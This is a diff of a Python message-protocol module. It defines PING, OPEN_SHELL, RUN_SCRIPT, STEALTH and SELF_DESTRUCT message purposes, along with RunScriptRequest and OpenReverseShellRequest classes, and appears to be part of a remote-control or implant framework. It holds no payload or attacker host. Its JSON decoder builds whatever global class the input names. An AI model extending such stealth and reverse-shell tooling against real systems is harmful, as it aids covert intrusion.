@@ -1,45 +1,88 @@
-from typing import Iterable, List, Optional
-from base64 import b64encode, b64decode
+from typing import List, Optional
 import random
 import string
+from dataclasses import dataclass
+import json
+import inspect
 
 
 class MESSAGE_PURPOSE:
-    PING, OPEN_SHELL, RUN_SCRIPT, STEALTH, SELF_DESTRUCT = [str(i) for i in range(5)]
+    PING = 'PING'
+    OPEN_SHELL = 'OPEN_SHELL'
+    RUN_SCRIPT = 'RUN_SCRIPT'
+    STEALTH = 'STEALTH'
+    SELF_DESTRUCT = 'SELF_DESTRUCT'
 
 
 class Message:
-    # source_instance_id: str
-    # destination_instance_id: str
-    purpose: str
-    args: List[bytes]
-    message_id: str
-    reply_message_id: Optional[str]
+    def encode(self):
+        json_obj = self.__dict__.copy()
+        json_obj['__class__'] = self.__class__.__name__
+        json_str = json.dumps(json_obj, indent=2)
+        return json_str
 
-    def __init__(self, purpose: str, args: Optional[Iterable[bytes]] = None, message_id: str = None, reply_message_id: Optional[str] = None):
-        self.purpose = purpose
-        self.args = list(args) if args is not None else []
-        self.message_id = message_id if message_id is not None else ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
-        self.reply_message_id = reply_message_id
+    @staticmethod
+    def decode(json_str: str):
+        json_obj = json.loads(json_str)
+        assert isinstance(json_obj, dict), 'json_obj must be a dict'
 
-    def to_string(self) -> str:
-        return ':'.join([b64encode(prop.encode()).decode() for prop in (
-            self.purpose,
-            ':'.join([b64encode(arg).decode() for arg in self.args]),
-            self.message_id,
-            self.reply_message_id if self.reply_message_id is not None else ''
-        )])
+        message_class_name = json_obj.get('__class__')
+        del json_obj['__class__']
+        assert message_class_name is not None, 'message_class_name cannot be none'
 
-    @classmethod
-    def from_string(cls, line: str) -> 'Message':
-        props = [b64decode(prop).decode() for prop in line.split(':')]
-        props_formatted = [
-                props[0],
-                tuple(b64decode(arg) for arg in props[1].split(':')),
-                props[2],
-                props[3] if props[3] != '' else None,
-        ]
-        return cls(*props_formatted)
+        message_class = globals().get(message_class_name)
+        if (message_class is None) or (not inspect.isclass(message_class)):
+            raise Exception(f'Constructor for {message_class_name} is missing')
 
-    def __str__(self):
-        return f'{self.message_id}:{self.purpose}:{self.args}'
+        # constructor_kwargs = {}
+        # post_construct_attributes = json_obj.copy()
+        # for key in message_class.__dataclass_fields__.keys():
+        #     constructor_kwargs[key] = json_obj[key]
+        #     del post_construct_attributes[key]
+
+        message_obj = message_class(**json_obj)
+        # for key in post_construct_attributes:
+        #     setattr(message_obj, key, post_construct_attributes[key])
+        return message_obj
+
+
+class Request(Message):
+    request_id: str
+
+    def __init__(self, request_id: Optional[str] = None):
+        super().__init__()
+        self.request_id = request_id if request_id else ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
+
+
+@dataclass
+class Response(Message):
+    request_id: str
+
+    def __init__(self, request_id: str):
+        self.request_id = request_id
+
+
+class PingRequest(Request):
+    pass
+
+
+class PingResponse(Response):
+    pass
+
+
+class RunScriptRequest(Request):
+    script_name: str
+    script_args: List[str]
+
+    def __init__(self, script_name: str, script_args: List[str], **kwargs):
+        super().__init__(**kwargs)
+        self.script_name = script_name
+        self.script_args = script_args
+
+
+class OpenReverseShellRequest(Request):
+    port: int
+
+    def __init__(self, port: int, **kwargs):
+        super().__init__(**kwargs)
+        self.port = port
